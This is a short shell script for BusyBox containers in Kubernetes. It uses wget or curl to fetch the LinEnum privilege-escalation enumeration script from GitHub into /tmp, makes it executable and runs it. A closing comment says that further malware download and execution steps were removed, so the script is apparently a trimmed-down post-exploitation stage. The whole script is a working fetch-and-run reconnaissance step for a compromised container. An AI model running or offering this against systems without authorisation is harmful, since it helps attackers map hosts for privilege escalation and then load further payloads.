#!/bin/sh

# Kubernetes-compatible BusyBox Script for Enumeration

# Step 1: Set Up Environment Variables and Directories
export DOWNLOAD_DIR="/tmp"

# Function to download a file using wget or curl, if available
download_file() {
  URL="$1"
  OUTPUT="$2"
  
  if command -v wget >/dev/null 2>&1; then
    echo "[+] Downloading $OUTPUT using wget..."
    wget "$URL" -O "$OUTPUT"
  elif command -v curl >/dev/null 2>&1; then
    echo "[+] Downloading $OUTPUT using curl..."
    curl -o "$OUTPUT" "$URL"
  else
    echo "[-] Neither wget nor curl is available. Exiting."
    exit 1
  fi
}

# Step 2: Download Enumeration Script
echo "[+] Downloading enumeration script..."
download_file "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" "$DOWNLOAD_DIR/enum_script.sh"

# Step 3: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod +x "$DOWNLOAD_DIR/enum_script.sh"

# Step 4: Run the Enumeration Script
echo "[+] Running the enumeration script..."
sh "$DOWNLOAD_DIR/enum_script.sh"

# Note: Additional malware download and execution steps have been removed 
# as they are inappropriate for a standard Kubernetes and BusyBox environment.

echo "[+] Script execution completed."
exit 0
